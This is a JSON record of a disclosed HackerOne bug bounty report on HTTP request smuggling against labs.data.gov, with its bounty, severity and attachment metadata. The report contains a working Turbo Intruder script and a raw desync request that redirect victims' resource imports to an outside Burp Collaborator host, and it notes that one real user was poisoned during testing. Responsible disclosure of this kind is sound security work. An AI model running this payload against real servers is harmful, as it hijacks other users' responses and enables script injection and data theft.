@@ -1,0 +1,234 @@
+{
+  "id": 726773,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjY3NzM=",
+  "url": "https://hackerone.com/reports/726773",
+  "title": "HTTP Request Smuggling on https://labs.data.gov",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-10-31T16:18:21.474Z",
+  "submitted_at": "2019-10-31T16:18:21.474Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "puppykok",
+    "url": "/puppykok",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jAA7vzpZmTCTLuyqR9Po9YHG/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50592,
+    "url": "https://hackerone.com/gsa_bbp",
+    "handle": "gsa_bbp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GSA Bounty",
+      "twitter_handle": null,
+      "website": "http://gsa.gov",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-05-13T16:28:01.942Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-05-13T05:53:01.247Z",
+  "team_member_agreed_on_going_public_at": "2020-05-13T16:28:01.800Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Greetings,\n\nThe application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses the Content-Length header, which causes a desync. The following steps outline how to reproduce this vulnerability:\n\nThe purpose of the following Turbo Intruder script is to send a desync request followed by 14 requests in quick succession to increase the chances of catching the desync-ed request such that it would not poison the request of another user who happens to be browsing the page.\n```\nimport re\n\ndef queueRequests(target, wordlists):\n\n    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=5,\n                           requestsPerConnection=1,\n                           resumeSSL=False,\n                           timeout=10,\n                           pipeline=False,\n                           maxRetriesPerRequest=0,\n                           engine=Engine.THREADED,\n                           )\n    engine.start()\n\n    prefix = '''POST /hopefully404 HTTP/1.1\nHost: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1'''\n\n    chunk_size = hex(len(prefix)).lstrip(\"0x\")\n    attack = target.req.replace('0\\r\\n\\r\\n', chunk_size+'\\r\\n'+prefix+'\\r\\n0\\r\\n\\r\\n')\n    content_length = re.search('Content-Length: ([\\d]+)', attack).group(1)\n    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))\n    engine.queue(attack)\n\n    for i in range(14):\n        engine.queue(target.req)\n        time.sleep(0.05)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n```\nThe following desync request issued to the server is shown below, where I changed the host header to my Burp's collaborator domain:\n```\nPOST / HTTP/1.1\nHost: labs.data.gov\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding : chunked\n\na2\nPOST /hopefully404 HTTP/1.1\nHost: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0\n```\nFrom the following screenshot, you can see that a 'victim' request was caught which redirected to a 404 page, just as intended, since `https://www.data.gov/hopefully404` does not actually exist. In addition, by searching for my Burp's collaborator URL, you can see that there are 67 instances where the URL is reflected, some within script tags and sources:\n{F622456}\n\nThe following request is heavily shortened to show that the attacker's host URL is reflected in multiple critical areas within the victim's response:\n``` \n-snip\n<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"WebSite\",\"@id\":\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/#website\",\"url\":\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/\",\"name\":\"Data.gov\",\"potentialAction\":{\"@type\":\"SearchAction\",\"target\":\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/?s={search_term_string}\",\"query-input\":\"required name=search_term_string\"}}]}</script>\n<!-- / Yoast SEO plugin. -->\n\n-snip-\n\n<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4\">\n<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16\">\n<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/common.min.css?ver=4.9.16\">\n<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.9.16\">\n<link rel=\"stylesheet\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/wp/wp-includes/css/dist/block-library/style.min.css?ver=5.2.4\">\n\n-snip-\n\n<a class=\"dropdown-toggle local-link\" data-toggle=\"dropdown\" data-target=\"#\" href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/communities/\">Topics <b class=\"caret\"></b></a>\n<ul class=\"dropdown-menu topics\">\n\t<li class=\"menu-agriculture topic-food\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/food/\" class=\"local-link\"><i></i><span>Agriculture</span></a></li>\n\t<li class=\"menu-climate topic-climate\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/climate/\" class=\"local-link\"><i></i><span>Climate</span></a></li>\n\t<li class=\"menu-consumer topic-consumer\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/consumer/\" class=\"local-link\"><i></i><span>Consumer</span></a></li>\n\t<li class=\"menu-ecosystems topic-ecosystems\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/ecosystems/\" class=\"local-link\"><i></i><span>Ecosystems</span></a></li>\n\t<li class=\"menu-education topic-education\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/education/\" class=\"local-link\"><i></i><span>Education</span></a></li>\n\t<li class=\"menu-energy topic-energy\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/energy/\" class=\"local-link\"><i></i><span>Energy</span></a></li>\n\t<li class=\"menu-finance topic-finance\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/finance/\" class=\"local-link\"><i></i><span>Finance</span></a></li>\n\t<li class=\"menu-health topic-health\"><a href=\"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/health/\" class=\"local-link\"><i></i><span>Health</span></a></li>\n```\nNote that this attack is not reliable and we may fail to 'catch on' to the victim's request which might inadvertently affect an innocent user. During testing, there was one such case of this happening and the Burp Collaborator manages to posion someone from Los Angeles, California:\n{F622459}\n{F622460}\nIn order to prevent affecting more innocent users, I stopped further testing after coming with the above proof of concept which should be sufficent to proof the existence of the vulnerability. Please let me know if any additional information is needed and I will gladly provide.\n\n## Impact\n\nSince the javascript imports on the page can be determined by the attacker, he can host a malicious domain to steal user data, perform stored cross-site scripting and defacing the webpage for the user whos request was poisoned by the desynced request. In addition, I noticed there was a Wordpress login page but seems like it requires a specially-configured browser to access the SSO. My suspicion is that it is very likely that an attacker can steal authenticated cookies/headers which will be sent to an attacker-controlled server, although I am unable to verify (Can't get SSO to work on my browser).",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 622456,
+      "file_name": "turbo1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iJodnWM1HXwufBPQvPq5yMUv?response-content-disposition=attachment%3B%20filename%3D%22turbo1.png%22%3B%20filename%2A%3DUTF-8%27%27turbo1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5CUWFK5L%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050852Z&X-Amz-Expires=314&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAVLQ1k%2FE9mni3x%2B8gApBqsnejRsdMWQn0fTw7TVqgNaAiEA93h29Npxt2rzfKrJ9RU4a%2BW7rRmK1yMDu2DfhMF5yVMqsQUIeBADGgwwMTM2MTkyNzQ4NDkiDCagDSrjynWtn06X6iqOBdmCnll5QGOIBe9kr8nGAvg1ay3vP1Wp4cHdI%2BHlmIUrCf%2BZUw8UJnQap2l6BszyMFiaOLxYwTm1coajgxWKcLFv3LLo0vw37zDLBb8OgXwl5eD2iyi2G1P2GjN9xPJs7WcsU0oTNUUnoeTz5G8EDjI8eQ1r3Hc9eorwVTG2aCaC0q46zS%2FdXMKJBeJZ1L7K7sOkcK%2B%2F7dElxs9FUYnuMhPBQpFmBaD589ZEMs5OQwjancnUv9iP26EMVqftydm4jnPyqDOB0ZWpXRjw9jKGjkEOfdzP6bqH0N%2FOl71ZjY3tFX7R2PZuqoHufilAhuzPTu2RGUTF%2F1PvwrZe5t8L%2Bt4CSL3dHn433342NGNasCYgyESmkZ2zAIQ%2B7NWpvjYCayq1WDtI%2FwtMkYBxulYCfVXv54GzH0%2Bl3Ha0364oKQLCFRaVuWTV9Nm%2F4nVE%2FZJOV5ZpUTPY107ARCYzbsjSGNfvN%2FEvufC1SHrvn7vj112wMGBI3uqTTJwW5ZYlLb4dw2YrqX4Vx0mthFIzaIii7mk3mWZ8H8i8dUhqGHqtiKU8Qpm7Lz6XGVyse3A7Bqkr35dXYFMlmTzQg7wW0E3zSeeTjF0g2ePt2V99je%2F374IxiGojp5uV6iEY0BTY0u54985GDBdIpkjgZvSx3G00SyToeOggkEfIRYEfpc1Y%2BQJ3blI8Sl6qy3TW6i%2B20JNM85ERw7vVsu3Cra1M9vLnc9U83lhr80J54zXI8hJvzQoSNDRAUdEQ1aYWxAcDqrTZ%2BgZRmQLpKbKJayxnna29OZtuiCiHE1IITh2u7mmM%2FTbc7NVf2SwvxTecJ5QsTldU7aPhvqZynVLGISnEIXrU7WLm3ce7L3YEQrCddbY9YTD7hLbSBjqxAWYW%2F2S%2Bej1V4MXN4A3tsT35c3RNNZb8QhfUKjjb7rGeCYXAtPq4sEnXqt4sJ6CwvS5vxu7OBltMmOyVi9SrzfeTRoRgzz7LS1q4GwWm85kt%2FJKkdwrij4knt4R9GMkENyUxhtNU0XsxVI9vm1ChfkQXOo6R4Oq%2BXXFQPRJqXpfS2GAg9ay1%2FLrJ2RYzktTS1Lr26eGLIcWhQmtIY6Ac3VjFDobJKA%2FJoAZfG1E4DbUnVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ab985f1bf18913f94ef89e3e553b6f1106ccd3c3a0977d8548e33248bb6d298b",
+      "file_size": 89686,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 622459,
+      "file_name": "turbo2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LayXASEX5Qc7U8g4rsYArLP9?response-content-disposition=attachment%3B%20filename%3D%22turbo2.png%22%3B%20filename%2A%3DUTF-8%27%27turbo2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5CUWFK5L%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050852Z&X-Amz-Expires=314&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAVLQ1k%2FE9mni3x%2B8gApBqsnejRsdMWQn0fTw7TVqgNaAiEA93h29Npxt2rzfKrJ9RU4a%2BW7rRmK1yMDu2DfhMF5yVMqsQUIeBADGgwwMTM2MTkyNzQ4NDkiDCagDSrjynWtn06X6iqOBdmCnll5QGOIBe9kr8nGAvg1ay3vP1Wp4cHdI%2BHlmIUrCf%2BZUw8UJnQap2l6BszyMFiaOLxYwTm1coajgxWKcLFv3LLo0vw37zDLBb8OgXwl5eD2iyi2G1P2GjN9xPJs7WcsU0oTNUUnoeTz5G8EDjI8eQ1r3Hc9eorwVTG2aCaC0q46zS%2FdXMKJBeJZ1L7K7sOkcK%2B%2F7dElxs9FUYnuMhPBQpFmBaD589ZEMs5OQwjancnUv9iP26EMVqftydm4jnPyqDOB0ZWpXRjw9jKGjkEOfdzP6bqH0N%2FOl71ZjY3tFX7R2PZuqoHufilAhuzPTu2RGUTF%2F1PvwrZe5t8L%2Bt4CSL3dHn433342NGNasCYgyESmkZ2zAIQ%2B7NWpvjYCayq1WDtI%2FwtMkYBxulYCfVXv54GzH0%2Bl3Ha0364oKQLCFRaVuWTV9Nm%2F4nVE%2FZJOV5ZpUTPY107ARCYzbsjSGNfvN%2FEvufC1SHrvn7vj112wMGBI3uqTTJwW5ZYlLb4dw2YrqX4Vx0mthFIzaIii7mk3mWZ8H8i8dUhqGHqtiKU8Qpm7Lz6XGVyse3A7Bqkr35dXYFMlmTzQg7wW0E3zSeeTjF0g2ePt2V99je%2F374IxiGojp5uV6iEY0BTY0u54985GDBdIpkjgZvSx3G00SyToeOggkEfIRYEfpc1Y%2BQJ3blI8Sl6qy3TW6i%2B20JNM85ERw7vVsu3Cra1M9vLnc9U83lhr80J54zXI8hJvzQoSNDRAUdEQ1aYWxAcDqrTZ%2BgZRmQLpKbKJayxnna29OZtuiCiHE1IITh2u7mmM%2FTbc7NVf2SwvxTecJ5QsTldU7aPhvqZynVLGISnEIXrU7WLm3ce7L3YEQrCddbY9YTD7hLbSBjqxAWYW%2F2S%2Bej1V4MXN4A3tsT35c3RNNZb8QhfUKjjb7rGeCYXAtPq4sEnXqt4sJ6CwvS5vxu7OBltMmOyVi9SrzfeTRoRgzz7LS1q4GwWm85kt%2FJKkdwrij4knt4R9GMkENyUxhtNU0XsxVI9vm1ChfkQXOo6R4Oq%2BXXFQPRJqXpfS2GAg9ay1%2FLrJ2RYzktTS1Lr26eGLIcWhQmtIY6Ac3VjFDobJKA%2FJoAZfG1E4DbUnVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a5b6271d5804c327973c14b9c40477686c55cf9dc0694c406df3f2da7bdbbad8",
+      "file_size": 11350,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 622460,
+      "file_name": "turbo3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UbC4qUtuUNNF9qLn4veEuRLp?response-content-disposition=attachment%3B%20filename%3D%22turbo3.png%22%3B%20filename%2A%3DUTF-8%27%27turbo3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5CUWFK5L%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050852Z&X-Amz-Expires=314&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAVLQ1k%2FE9mni3x%2B8gApBqsnejRsdMWQn0fTw7TVqgNaAiEA93h29Npxt2rzfKrJ9RU4a%2BW7rRmK1yMDu2DfhMF5yVMqsQUIeBADGgwwMTM2MTkyNzQ4NDkiDCagDSrjynWtn06X6iqOBdmCnll5QGOIBe9kr8nGAvg1ay3vP1Wp4cHdI%2BHlmIUrCf%2BZUw8UJnQap2l6BszyMFiaOLxYwTm1coajgxWKcLFv3LLo0vw37zDLBb8OgXwl5eD2iyi2G1P2GjN9xPJs7WcsU0oTNUUnoeTz5G8EDjI8eQ1r3Hc9eorwVTG2aCaC0q46zS%2FdXMKJBeJZ1L7K7sOkcK%2B%2F7dElxs9FUYnuMhPBQpFmBaD589ZEMs5OQwjancnUv9iP26EMVqftydm4jnPyqDOB0ZWpXRjw9jKGjkEOfdzP6bqH0N%2FOl71ZjY3tFX7R2PZuqoHufilAhuzPTu2RGUTF%2F1PvwrZe5t8L%2Bt4CSL3dHn433342NGNasCYgyESmkZ2zAIQ%2B7NWpvjYCayq1WDtI%2FwtMkYBxulYCfVXv54GzH0%2Bl3Ha0364oKQLCFRaVuWTV9Nm%2F4nVE%2FZJOV5ZpUTPY107ARCYzbsjSGNfvN%2FEvufC1SHrvn7vj112wMGBI3uqTTJwW5ZYlLb4dw2YrqX4Vx0mthFIzaIii7mk3mWZ8H8i8dUhqGHqtiKU8Qpm7Lz6XGVyse3A7Bqkr35dXYFMlmTzQg7wW0E3zSeeTjF0g2ePt2V99je%2F374IxiGojp5uV6iEY0BTY0u54985GDBdIpkjgZvSx3G00SyToeOggkEfIRYEfpc1Y%2BQJ3blI8Sl6qy3TW6i%2B20JNM85ERw7vVsu3Cra1M9vLnc9U83lhr80J54zXI8hJvzQoSNDRAUdEQ1aYWxAcDqrTZ%2BgZRmQLpKbKJayxnna29OZtuiCiHE1IITh2u7mmM%2FTbc7NVf2SwvxTecJ5QsTldU7aPhvqZynVLGISnEIXrU7WLm3ce7L3YEQrCddbY9YTD7hLbSBjqxAWYW%2F2S%2Bej1V4MXN4A3tsT35c3RNNZb8QhfUKjjb7rGeCYXAtPq4sEnXqt4sJ6CwvS5vxu7OBltMmOyVi9SrzfeTRoRgzz7LS1q4GwWm85kt%2FJKkdwrij4knt4R9GMkENyUxhtNU0XsxVI9vm1ChfkQXOo6R4Oq%2BXXFQPRJqXpfS2GAg9ay1%2FLrJ2RYzktTS1Lr26eGLIcWhQmtIY6Ac3VjFDobJKA%2FJoAZfG1E4DbUnVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f747fcaff2c20a89fd0cc48a2e89ebf9c7917ae3e0a040c8563322561c4d7062",
+      "file_size": 22309,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 160,
+  "voters": [
+    "boldagihororok",
+    "orange303",
+    "is-",
+    "qbit_",
+    "sklnhunt",
+    "pr3da70r",
+    "tess",
+    "nightm4re",
+    "shreyaschavhan",
+    "dmc3",
+    "and 150 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 81476,
+    "asset_type": "URL",
+    "asset_identifier": "labs.data.gov",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "726773",
+  "votes": 160,
+  "latest_disclosable_activity_at": "2020-05-13T16:28:01.988Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:08:52.938128",
+    "source": "https://hackerone.com/reports/726773.json",
+    "report_id": 726773
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjY3NzM=",
+    "databaseId": "726773",
+    "title": "HTTP Request Smuggling on https://labs.data.gov",
+    "url": "https://hackerone.com/reports/726773",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-05-13T16:28:01.942Z",
+    "created_at": "2019-10-31T16:18:21.474Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzg2",
+      "name": "HTTP Request Smuggling",
+      "external_id": "cwe-444"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 7.7
+    },
+    "reporter": {
+      "username": "puppykok"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzUwNTky",
+      "handle": "gsa_bbp",
+      "name": "GSA Bounty",
+      "url": "https://hackerone.com/gsa_bbp",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNzIwNjM=",
+            "amount": "750.00",
+            "awarded_amount": "750.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-11-14T08:05:17.243Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzcyNjc3Mw==",
+    "_id": "726773",
+    "disclosed": true,
+    "votes": 160,
+    "latest_disclosable_activity_at": "2020-05-13T16:28:01.988Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MjY3NzM=",
+      "databaseId": "726773",
+      "title": "HTTP Request Smuggling on https://labs.data.gov",
+      "url": "https://hackerone.com/reports/726773",
+      "disclosed_at": "2020-05-13T16:28:01.942Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzUwNTky",
+      "handle": "gsa_bbp",
+      "name": "GSA Bounty",
+      "url": "https://hackerone.com/gsa_bbp",
+      "currency": "usd"
+    }
+  }
+}
